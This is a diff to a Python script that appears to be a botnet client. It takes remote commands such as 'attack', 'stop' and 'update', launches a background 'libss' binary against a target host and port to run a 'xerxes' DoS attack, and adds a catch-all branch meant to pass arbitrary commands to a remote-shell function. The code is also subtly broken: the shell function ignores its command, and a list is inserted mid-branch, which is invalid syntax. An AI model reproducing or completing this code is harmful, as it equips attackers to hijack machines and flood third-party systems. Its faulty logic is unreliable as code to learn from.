@@ -35,7 +35,7 @@ def update_source():
 
 
 
-def ls_syss(sock):
+def shell(sock,cmd):
   out = os.popen("ls -la $HOME/.syss").read()
   bout = bytes(out,"utf-8")
   sock.send(bout)
@@ -139,6 +139,7 @@ def executa(cmd):
       print(myloc)
       os.system("{}/libss {} {} </dev/null &>/dev/null &".format(myloc,t_host,t_port))
 
+  commands = ["stop","keep","attack","alive","update"]
   elif "stop" in cmd:
     print("xerxes killed!")
     mata_xerxes()
@@ -157,8 +158,9 @@ def executa(cmd):
   elif "update" in cmd:
     update_source()
 
-  elif "ls syss" in cmd:
-    ls_syss(sock)
+  else:
+    shell(sock,cmd)
+        
 
 user = os.popen("whoami").read()[:-1]
 
